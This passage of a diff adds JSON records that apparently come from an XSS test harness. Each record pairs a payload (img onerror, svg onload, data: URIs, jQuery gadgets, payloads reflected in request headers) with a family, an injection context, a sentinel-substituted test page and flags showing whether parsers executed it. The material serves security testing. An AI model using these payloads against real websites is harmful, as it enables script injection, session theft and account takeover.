+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><svg><on:load={__x()}></on:load={__x()}></svg></div>"
+  },
+  {
+   "payload": "<input on:focus={alert(1)} />",
+   "family": "framework_svelte",
+   "host": "text",
+   "document": "<html><body><div><input on:focus={__x()} /></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><input on:focus=\"{__x()}\"></div>"
+  },
+  {
+   "payload": "<svelte:component this={() => { eval('alert(1)') }} />",
+   "family": "framework_svelte",
+   "host": "text",
+   "document": "<html><body><div><svelte:component this={() => { eval('__x()') }} /></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><svelte:component this=\"{()\" ==\"\"> { eval('__x()') }} /&gt;</svelte:component></div>"
+  },
+  {
+   "payload": "![xss](\"onerror=alert(1))",
+   "family": "markdown",
+   "host": "text",
+   "document": "<html><body><div>![xss](\"onerror=__x())</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div>![xss](\"onerror=__x())</div>"
+  },
+  {
+   "payload": "![xss](x\"onerror=alert(1))",
+   "family": "markdown",
+   "host": "text",
+   "document": "<html><body><div>![xss](x\"onerror=__x())</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div>![xss](x\"onerror=__x())</div>"
+  },
+  {
+   "payload": "![xss](x onerror=alert(1))",
+   "family": "markdown",
+   "host": "text",
+   "document": "<html><body><div>![xss](x onerror=__x())</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div>![xss](x onerror=__x())</div>"
+  },
+  {
+   "payload": "<img src=x onerror=alert(1)//>",
+   "family": "markdown",
+   "host": "text",
+   "document": "<html><body><div><img src=x onerror=__x()//></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><img src=\"x\" onerror=\"__x()//\"></div>"
+  },
+  {
+   "payload": "User-Agent: <img src=x onerror=alert(1)>",
+   "family": "header_reflection",
+   "host": "text",
+   "document": "<html><body><div>User-Agent: <img src=x onerror=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div>User-Agent: <img src=\"x\" onerror=\"__x()\"></div>"
+  },
+  {
+   "payload": "User-Agent: <svg onload=alert(1)>",
+   "family": "header_reflection",
+   "host": "text",
+   "document": "<html><body><div>User-Agent: <svg onload=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<div>User-Agent: <svg onload=\"__x()\"></svg></div>"
+  },
+  {
+   "payload": "Referer: <img src=x onerror=alert(1)>",
+   "family": "header_reflection",
+   "host": "text",
+   "document": "<html><body><div>Referer: <img src=x onerror=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div>Referer: <img src=\"x\" onerror=\"__x()\"></div>"
+  },
+  {
+   "payload": "Referer: <svg onload=alert(1)>",
+   "family": "header_reflection",
+   "host": "text",
+   "document": "<html><body><div>Referer: <svg onload=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<div>Referer: <svg onload=\"__x()\"></svg></div>"
+  },
+  {
+   "payload": "Cookie: x=<img src=x onerror=alert(1)>",
+   "family": "header_reflection",
+   "host": "text",
+   "document": "<html><body><div>Cookie: x=<img src=x onerror=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div>Cookie: x=<img src=\"x\" onerror=\"__x()\"></div>"
+  },
+  {
+   "payload": "Cookie: x=<svg onload=alert(1)>",
+   "family": "header_reflection",
+   "host": "text",
+   "document": "<html><body><div>Cookie: x=<svg onload=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<div>Cookie: x=<svg onload=\"__x()\"></svg></div>"
+  },
+  {
+   "payload": "X-Forwarded-For: <img src=x onerror=alert(1)>",
+   "family": "header_reflection",
+   "host": "text",
+   "document": "<html><body><div>X-Forwarded-For: <img src=x onerror=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div>X-Forwarded-For: <img src=\"x\" onerror=\"__x()\"></div>"
+  },
+  {
+   "payload": "X-Forwarded-For: <svg onload=alert(1)>",
+   "family": "header_reflection",
+   "host": "text",
+   "document": "<html><body><div>X-Forwarded-For: <svg onload=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<div>X-Forwarded-For: <svg onload=\"__x()\"></svg></div>"
+  },
+  {
+   "payload": "X-Forwarded-Host: <img src=x onerror=alert(1)>",
+   "family": "header_reflection",
+   "host": "text",
+   "document": "<html><body><div>X-Forwarded-Host: <img src=x onerror=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div>X-Forwarded-Host: <img src=\"x\" onerror=\"__x()\"></div>"
+  },
+  {
+   "payload": "/<img src=x onerror=alert(1)>",
+   "family": "path_xss",
+   "host": "text",
+   "document": "<html><body><div>/<img src=x onerror=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div>/<img src=\"x\" onerror=\"__x()\"></div>"
+  },
+  {
+   "payload": "/<svg onload=alert(1)>",
+   "family": "path_xss",
+   "host": "text",
+   "document": "<html><body><div>/<svg onload=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<div>/<svg onload=\"__x()\"></svg></div>"
+  },
+  {
+   "payload": "<button onfocus=alert(1) autofocus>",
+   "family": "error_page",
+   "host": "text",
+   "document": "<html><body><div><button onfocus=__x() autofocus></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><button onfocus=\"__x()\" autofocus=\"\"></button></div>"
+  },
+  {
+   "payload": "<form action=javascript:alert(1)><input type=submit>",
+   "family": "error_page",
+   "host": "text",
+   "document": "<html><body><div><form action=javascript:__x()><input type=submit></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><form action=\"javascript:__x()\"><input type=\"submit\"></form></div>"
+  },
+  {
+   "payload": "<isindex action=javascript:alert(1)>",
+   "family": "error_page",
+   "host": "text",
+   "document": "<html><body><div><isindex action=javascript:__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><isindex action=\"javascript:__x()\"></isindex></div>"
+  },
+  {
+   "payload": "<isindex onmouseover=alert(1)>",
+   "family": "error_page",
+   "host": "text",
+   "document": "<html><body><div><isindex onmouseover=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><isindex onmouseover=\"__x()\"></isindex></div>"
+  },
+  {
+   "payload": "<table background=javascript:alert(1)>",
+   "family": "error_page",
+   "host": "text",
+   "document": "<html><body><div><table background=javascript:__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><table background=\"javascript:__x()\"></table></div>"
+  },
+  {
+   "payload": "<td background=javascript:alert(1)>",
+   "family": "error_page",
+   "host": "text",
+   "document": "<html><body><div><td background=javascript:__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div></div>"
+  },
+  {
+   "payload": "<body background=javascript:alert(1)>",
+   "family": "error_page",
+   "host": "text",
+   "document": "<html><body><div><body background=javascript:__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div></div>"
+  },
+  {
+   "payload": "<bgsound src=javascript:alert(1)>",
+   "family": "error_page",
+   "host": "text",
+   "document": "<html><body><div><bgsound src=javascript:__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><bgsound src=\"javascript:__x()\"></div>"
+  },
+  {
+   "payload": "<img/src=`javascript:alert(1)`/onerror=alert(1)>",
+   "family": "error_page",
+   "host": "text",
+   "document": "<html><body><div><img/src=`javascript:__x()`/onerror=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><img src=\"`javascript:__x()`/onerror=__x()\"></div>"
+  },
+  {
+   "payload": "<img/src=`x`/onerror=`alert(1)`>",
+   "family": "error_page",
+   "host": "text",
+   "document": "<html><body><div><img/src=`x`/onerror=`__x()`></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><img src=\"`x`/onerror=`__x()`\"></div>"
+  },
+  {
+   "payload": "<div id=x><script>$('#x').html('<img src=x onerror=alert(1)>')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$('#x').html('<img src=x onerror=__x()>')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$('#x').html('<img src=x onerror=__x()>')</script>"
+  },
+  {
+   "payload": "<div id=x><script>$('#x').append('<img src=x onerror=alert(1)>')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$('#x').append('<img src=x onerror=__x()>')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$('#x').append('<img src=x onerror=__x()>')</script>"
+  },
+  {
+   "payload": "<div id=x><script>$('#x').prepend('<img src=x onerror=alert(1)>')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$('#x').prepend('<img src=x onerror=__x()>')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$('#x').prepend('<img src=x onerror=__x()>')</script>"
+  },
+  {
+   "payload": "<div id=x><script>$('#x').after('<img src=x onerror=alert(1)>')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$('#x').after('<img src=x onerror=__x()>')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$('#x').after('<img src=x onerror=__x()>')</script>"
+  },
+  {
+   "payload": "<div id=x><script>$('#x').before('<img src=x onerror=alert(1)>')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$('#x').before('<img src=x onerror=__x()>')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$('#x').before('<img src=x onerror=__x()>')</script>"
+  },
+  {
+   "payload": "<div id=x><script>$('#x').replaceWith('<img src=x onerror=alert(1)>')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$('#x').replaceWith('<img src=x onerror=__x()>')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$('#x').replaceWith('<img src=x onerror=__x()>')</script>"
+  },
+  {
+   "payload": "<div id=x><script>$(document).html('<img src=x onerror=alert(1)>')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$(document).html('<img src=x onerror=__x()>')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$(document).html('<img src=x onerror=__x()>')</script>"
+  },
+  {
+   "payload": "<div id=x><script>$('<img src=x onerror=alert(1)>').appendTo('#x')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$('<img src=x onerror=__x()>').appendTo('#x')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$('<img src=x onerror=__x()>').appendTo('#x')</script>"
+  },
+  {
+   "payload": "<div id=x><script>$('<img src=x onerror=alert(1)>').prependTo('#x')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$('<img src=x onerror=__x()>').prependTo('#x')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$('<img src=x onerror=__x()>').prependTo('#x')</script>"
+  },
+  {
+   "payload": "<div id=x><script>$('<img src=x onerror=alert(1)>').insertAfter('#x')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$('<img src=x onerror=__x()>').insertAfter('#x')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$('<img src=x onerror=__x()>').insertAfter('#x')</script>"
+  },
+  {
+   "payload": "<div id=x><script>$('<img src=x onerror=alert(1)>').insertBefore('#x')</script></div>",
+   "family": "script_gadget",
+   "host": "script_block",
+   "document": "<html><body><script><div id=x><script>$('<img src=x onerror=__x()>').insertBefore('#x')</script></div></script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<script><div id=x><script>$('<img src=x onerror=__x()>').insertBefore('#x')</script>"
+  },
+  {
+   "payload": "data:text/html,<img src=x onerror=alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<img src=x onerror=__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;img src=x onerror=__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<svg onload=alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<svg onload=__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;svg onload=__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<body onload=alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<body onload=__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;body onload=__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<details open ontoggle=alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<details open ontoggle=__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;details open ontoggle=__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<input onfocus=alert(1) autofocus>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<input onfocus=__x() autofocus>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;input onfocus=__x() autofocus&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<video><source onerror=alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<video><source onerror=__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;video&gt;&lt;source onerror=__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<audio src=x onerror=alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<audio src=x onerror=__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;audio src=x onerror=__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<object data=javascript:alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<object data=javascript:__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;object data=javascript:__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<embed src=javascript:alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<embed src=javascript:__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;embed src=javascript:__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<form action=javascript:alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<form action=javascript:__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;form action=javascript:__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<isindex action=javascript:alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<isindex action=javascript:__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;isindex action=javascript:__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "data:text/html,<table background=javascript:alert(1)>",
+   "family": "data_uri",
+   "host": "href_dq",
+   "document": "<html><body><a href=\"data:text/html,<table background=javascript:__x()>\">t</a></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<a href=\"data:text/html,&lt;table background=javascript:__x()&gt;\">t</a>"
+  },
+  {
+   "payload": "<button onpointerdown=alert(1)>x</button>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<button onpointerdown=__x()>x</button>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;button onpointerdown=__x()&gt;x&lt;/button&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<button onpointerup=alert(1)>x</button>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<button onpointerup=__x()>x</button>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;button onpointerup=__x()&gt;x&lt;/button&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<button onpointermove=alert(1)>x</button>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<button onpointermove=__x()>x</button>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;button onpointermove=__x()&gt;x&lt;/button&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<button onpointerover=alert(1)>x</button>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<button onpointerover=__x()>x</button>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;button onpointerover=__x()&gt;x&lt;/button&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<button onpointerout=alert(1)>x</button>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<button onpointerout=__x()>x</button>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;button onpointerout=__x()&gt;x&lt;/button&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<button onpointerenter=alert(1)>x</button>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<button onpointerenter=__x()>x</button>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;button onpointerenter=__x()&gt;x&lt;/button&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<button onmousedown=alert(1)>x</button>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<button onmousedown=__x()>x</button>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;button onmousedown=__x()&gt;x&lt;/button&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<button onmouseup=alert(1)>x</button>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<button onmouseup=__x()>x</button>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;button onmouseup=__x()&gt;x&lt;/button&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<div onmousemove=alert(1)>x</div>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<div onmousemove=__x()>x</div>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;div onmousemove=__x()&gt;x&lt;/div&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<div onmouseover=alert(1)>x</div>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<div onmouseover=__x()>x</div>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;div onmouseover=__x()&gt;x&lt;/div&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<div onmouseout=alert(1)>x</div>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<div onmouseout=__x()>x</div>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;div onmouseout=__x()&gt;x&lt;/div&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<div onmouseenter=alert(1)>x</div>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<div onmouseenter=__x()>x</div>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;div onmouseenter=__x()&gt;x&lt;/div&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<button ondblclick=alert(1)>x</button>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<button ondblclick=__x()>x</button>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;button ondblclick=__x()&gt;x&lt;/button&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<div onwheel=alert(1)>x</div>",
+   "family": "interaction_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<div onwheel=__x()>x</div>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;div onwheel=__x()&gt;x&lt;/div&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onhashchange=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onhashchange=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onhashchange=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onpopstate=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onpopstate=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onpopstate=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onpageshow=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onpageshow=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onpageshow=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onbeforeprint=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onbeforeprint=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onbeforeprint=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onunload=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onunload=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onunload=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onbeforeunload=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onbeforeunload=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onbeforeunload=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onresize=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onresize=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
